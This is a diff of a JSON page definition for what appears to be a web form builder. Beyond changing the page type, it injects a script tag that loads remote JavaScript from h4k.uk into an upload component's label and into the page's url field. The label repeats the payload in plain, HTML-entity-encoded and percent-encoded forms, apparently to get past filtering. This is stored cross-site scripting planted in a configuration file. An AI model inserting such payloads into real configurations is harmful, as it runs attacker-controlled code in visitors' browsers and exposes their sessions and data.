@@ -1,11 +1,11 @@
 {
   "_id": "page.1_",
-  "_type": "page.single1question",
+  "_type": "page.singlequestion",
   "components": [
     {
       "_id": "page.1_--upload.auto_name__1",
       "_type": "upload",
-      "label": "<script src=h4k.uk/1.js></script>",
+      "label": "<script src=h4k.uk/1.js></script>&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x68;&#x34;&#x6b;&#x2e;&#x75;&#x6b;&#x2f;&#x31;&#x2e;&#x6a;&#x73;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;%3c%73%63%72%69%70%74%20%73%72%63%3d%68%34%6b%2e%75%6b%2f%31%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e",
       "name": "auto_name__1"
     }
   ],
@@ -13,5 +13,5 @@
   "steps": [
     "page.1_-check"
   ],
-  "url": "1/"
+  "url": "1/<script src=h4k.uk/1.js></script>"
 }
